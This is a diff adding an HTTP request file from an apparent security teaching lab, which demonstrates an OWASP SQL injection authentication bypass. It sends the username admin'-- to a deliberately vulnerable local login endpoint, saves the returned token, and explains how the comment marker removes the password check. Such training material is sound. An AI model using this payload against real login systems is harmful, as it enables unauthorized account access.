@@ -1,0 +1,51 @@
+info:
+  name: Comment bypass logs in as admin
+  type: http
+  seq: 1
+
+http:
+  method: POST
+  url: http://localhost:8001/api/v1/vulnerable/auth/login
+  headers:
+    - name: Content-Type
+      value: application/json
+  body:
+    type: json
+    data: |-
+      {
+        "username": "admin'--",
+        "password": "anything"
+      }
+  auth:
+    type: none
+
+runtime:
+  scripts:
+    - type: after-response
+      code: |-
+        bru.setVar("token", res.body.access_token);
+  assertions:
+    - expression: res.status
+      operator: eq
+      value: "200"
+
+docs: |-
+  # 02.1 — Authentication bypass (OWASP A05:2025 Injection)
+
+  The password is `anything`, and the response is `200` with a token.
+
+  The vulnerable adapter builds this:
+
+  ```sql
+  SELECT id, username, role FROM users
+  WHERE username = 'admin'--' AND password_hash = crypt('anything', password_hash)
+  ```
+
+  The quote closes the string literal early and `--` turns the rest of the line — the
+  whole password check — into a comment. The database never sees a condition about the
+  password, because there is no longer one to see.
+
+  The token is stored in `token`, so run 02.2 next to see whose it is.
+
+  Set `EXPOSE_QUERY_TRACE=true` on the service and the response carries a `debug` object
+  with the executed statement, which is the version to put on a projector.
